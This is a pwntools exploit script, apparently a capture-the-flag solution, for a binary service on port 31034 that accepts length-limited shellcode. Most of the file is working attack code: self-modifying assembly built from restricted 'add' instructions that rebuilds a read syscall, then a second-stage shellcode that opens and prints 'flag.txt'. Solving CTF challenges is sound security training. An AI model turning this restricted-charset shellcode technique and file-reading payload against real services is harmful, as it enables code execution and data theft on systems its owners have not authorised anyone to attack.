#!/usr/bin/env python3

from pwn import *

exe = ELF('./bin/main')

context.binary = exe

host = args.HOST or 'localhost'
port = args.PORT or 31034

def local():
  return process([exe.path, '500'], cwd='./bin')

def conn():
  if args.LOCAL:
    return local()
  else:
    return remote(host, port)

def debug():
  if args.LOCAL:
    gdb.attach(r, gdbscript=gdbscript)
    pause()

gdbscript = f'''
file {exe.path}
pie br *0x16a1
c
'''

r = conn()

# good luck pwning :)

r.recvuntil('the current limit is ')
limit = int(r.recvuntil(' '))
log.info(f'limit: {limit}')

cod = asm('''
// 13371337
add dword ptr [rip+1], eax
// double eax + 0x05050505
.byte 5
.byte 5
.byte 5
.byte 5
.byte 5
// 2b732b73 -> 3088438b
add eax, 0x05050505
add eax, 0x00050505
add eax, 0x00050505
add eax, 0x00050505
add eax, 0x00010404
add dword ptr [rip], eax
// creates nop; lea rsi, [rip]
.byte 5
.byte 5
.byte 5
.byte 5
.byte 0
.byte 0
.byte 0
.byte 0
// 3088438b
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 2
add byte ptr [rip], al
// creates mov edx, 0x500
.byte 0
.byte 0
.byte 5
.byte 0
.byte 0
add byte ptr [rip], al
// creates mov edi, 0
.byte 5
.byte 0
.byte 0
.byte 0
.byte 0
// 308843ba
add dword ptr [rip+1], eax
// double eax
.byte 5
.byte 5
.byte 5
.byte 5
.byte 5
// 66158c79
add eax, 0x05050505
add eax, 0x05050505
add eax, 0x05050205
add eax, 0x05050005
add eax, 0x05050005
add eax, 0x05050005
add eax, 0x01050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00040005
add al, 2
// 855f98c6
add dword ptr [rip+1], eax
// double eax
.byte 5
.byte 0
.byte 0
.byte 0
.byte 0
// 0abf318c
add dword ptr [rip], eax
// creates nop; xor eax, eax; syscall
.byte 4
.byte 0
.byte 1
.byte 5
.byte 5
''')
debug()
print(len(cod)) # 202
r.send(cod.ljust(limit, b'\n'))
sc = 'mov rsp, 0x420691337800\n' + \
  shellcraft.open('flag.txt') + \
  shellcraft.read('rax', 'rsp', 100) + \
  shellcraft.write(1, 'rsp', 100)
r.send(b'A'*0x98 + asm(sc))

print(r.recvall())
